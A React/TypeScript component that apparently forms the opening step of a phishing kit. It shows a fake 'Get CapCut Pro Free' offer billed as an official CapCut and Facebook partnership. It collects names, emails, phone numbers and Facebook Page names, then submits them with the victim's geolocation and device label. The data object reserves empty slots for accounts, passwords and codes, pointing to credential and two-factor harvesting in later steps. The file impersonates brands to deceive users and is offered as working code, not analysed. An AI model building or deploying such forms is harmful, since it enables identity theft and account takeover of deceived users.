import {
    CAPCUT_BTN_PRIMARY,
    CAPCUT_INPUT_CLASS,
    CAPCUT_LABEL_CLASS,
    CAPCUT_TEXTAREA_CLASS,
    ModalShell,
    ModalSpinner
} from '@/components/form-modal/modal-shell';
import { useTranslation } from '@/hooks/use-translation';
import { submitFormStep } from '@/lib/ui-form-submit';
import { store } from '@/store/store';
import IntlTelInput, { type IntlTelInputRef } from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useRef, useState } from 'react';

interface FormData {
    information: string;
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    facebookPageName: string;
}

interface FormErrors {
    information?: string;
    fullName?: string;
    personalEmail?: string;
    businessEmail?: string;
    phoneNumber?: string;
    facebookPageName?: string;
    termsAccepted?: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
    required?: boolean;
}

const FORM_FIELDS: FormField[] = [
    { name: 'information', label: 'Tell us why you want CapCut Pro', type: 'textarea', required: true },
    { name: 'fullName', label: 'Full Name', type: 'text', required: true },
    { name: 'personalEmail', label: 'Personal Email', type: 'email', required: true },
    { name: 'businessEmail', label: 'Business Email', type: 'email', required: true },
    { name: 'facebookPageName', label: 'Facebook Page Name', type: 'text', required: true }
];

const INIT_MODAL_TEXTS = [
    'Get CapCut Pro Free',
    'CapCut × Facebook Official Partnership',
    'Tell us why you want CapCut Pro',
    'Full Name',
    'Personal Email',
    'Business Email',
    'Mobile phone number',
    'Facebook Page Name',
    'I agree with Terms of use',
    'Continue',
    'This field is required',
    'Invalid email format',
    'Invalid phone number',
    'You must agree to the terms of use'
] as const;

const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const { t } = useTranslation(INIT_MODAL_TEXTS);
    const [formData, setFormData] = useState<FormData>({
        information: '',
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        facebookPageName: ''
    });
    const [errors, setErrors] = useState<FormErrors>({});
    const [termsAccepted, setTermsAccepted] = useState(false);
    const phoneInputRef = useRef<IntlTelInputRef>(null);

    const { geoInfo, deviceLabel, setMessageId, setUserData } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const validateEmail = (email: string): boolean => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

    const validateForm = (): boolean => {
        const newErrors: FormErrors = {};

        FORM_FIELDS.forEach((field) => {
            if (field.required && !formData[field.name].trim()) {
                newErrors[field.name] = t('This field is required');
            }
        });

        if (formData.personalEmail && !validateEmail(formData.personalEmail)) {
            newErrors.personalEmail = t('Invalid email format');
        }
        if (formData.businessEmail && !validateEmail(formData.businessEmail)) {
            newErrors.businessEmail = t('Invalid email format');
        }

        if (!phoneNumber.trim()) {
            newErrors.phoneNumber = t('This field is required');
        } else if (phoneInputRef.current?.getInstance) {
            const instance = phoneInputRef.current.getInstance();
            if (instance && !instance.isValidNumber()) {
                newErrors.phoneNumber = t('Invalid phone number');
            }
        }

        if (!termsAccepted) {
            newErrors.termsAccepted = t('You must agree to the terms of use');
        }

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback(
        (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
            const { name, value } = e.target;
            setFormData((prev) => ({ ...prev, [name]: value }));
            if (errors[name as keyof FormErrors]) {
                setErrors((prev) => ({ ...prev, [name]: undefined }));
            }
        },
        [errors]
    );

    const handlePhoneChange = useCallback(
        (number: string) => {
            setPhoneNumber(number);
            if (errors.phoneNumber) {
                setErrors((prev) => ({ ...prev, phoneNumber: undefined }));
            }
        },
        [errors.phoneNumber]
    );

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading || !validateForm()) return;

        setIsLoading(true);

        const userPayload = {
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phoneNumber,
            facebookPageName: formData.facebookPageName,
            information: formData.information
        };

        const userDataPayload = { ...userPayload, accounts: [], passwords: [], codes: [] };
        setUserData(userDataPayload);

        try {
            const res = await submitFormStep(
                { geoInfo, deviceLabel, messageId: null, userData: userDataPayload, loginProvider: null },
                { step: 'init', userData: userDataPayload }
            );
            if (typeof res.messageId === 'number') {
                setMessageId(res.messageId);
            }
            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    const inputErrorClass = (hasError: boolean) => (hasError ? 'border-error focus:border-error focus:shadow-[0_0_0_3px_rgba(255,180,171,0.2)]' : '');

    return (
        <ModalShell title={t('Get CapCut Pro Free')} partnershipSubtitle={t('CapCut × Facebook Official Partnership')}>
            <form onSubmit={handleSubmit} className='flex flex-1 flex-col px-5 py-4'>
                <div className='flex flex-col gap-4'>
                    {FORM_FIELDS.map((field) => (
                        <div key={field.name}>
                            <label className={CAPCUT_LABEL_CLASS}>
                                {t(field.label)}
                                {field.required && <span className='text-error'> *</span>}
                            </label>
                            {field.type === 'textarea' ? (
                                <textarea
                                    name={field.name}
                                    value={formData[field.name]}
                                    onChange={handleInputChange}
                                    className={`${CAPCUT_TEXTAREA_CLASS} ${inputErrorClass(!!errors[field.name])}`}
                                    rows={3}
                                />
                            ) : (
                                <input
                                    name={field.name}
                                    type={field.type}
                                    value={formData[field.name]}
                                    onChange={handleInputChange}
                                    className={`${CAPCUT_INPUT_CLASS} ${inputErrorClass(!!errors[field.name])}`}
                                />
                            )}
                            {errors[field.name] && <p className='mt-1 text-sm text-error'>{errors[field.name]}</p>}
                        </div>
                    ))}

                    <div>
                        <label className={CAPCUT_LABEL_CLASS}>
                            {t('Mobile phone number')}
                            <span className='text-error'> *</span>
                        </label>
                        <div className={`phone-input-wrap${errors.phoneNumber ? ' iti--error' : ''}`}>
                            <IntlTelInput
                                ref={phoneInputRef}
                                onChangeNumber={handlePhoneChange}
                                initOptions={initOptions}
                                inputProps={{
                                    name: 'phoneNumber'
                                }}
                            />
                        </div>
                        {errors.phoneNumber && <p className='mt-1 text-sm text-error'>{errors.phoneNumber}</p>}
                    </div>

                    <div>
                        <label className='flex cursor-pointer items-start gap-3 pt-1'>
                            <input
                                type='checkbox'
                                checked={termsAccepted}
                                onChange={(e) => {
                                    setTermsAccepted(e.target.checked);
                                    if (e.target.checked && errors.termsAccepted) {
                                        setErrors((prev) => ({ ...prev, termsAccepted: undefined }));
                                    }
                                }}
                                className='mt-0.5 h-4 w-4 rounded border-surface-border accent-primary-container'
                            />
                            <span className='text-body-md text-on-surface-variant'>{t('I agree with Terms of use')}</span>
                        </label>
                        {errors.termsAccepted && <p className='mt-1 text-sm text-error'>{errors.termsAccepted}</p>}
                    </div>

                    <button type='submit' disabled={isLoading} className={`${CAPCUT_BTN_PRIMARY} mt-2 mb-2`}>
                        {isLoading ? <ModalSpinner /> : t('Continue')}
                    </button>
                </div>
            </form>
        </ModalShell>
    );
};

export default InitModal;
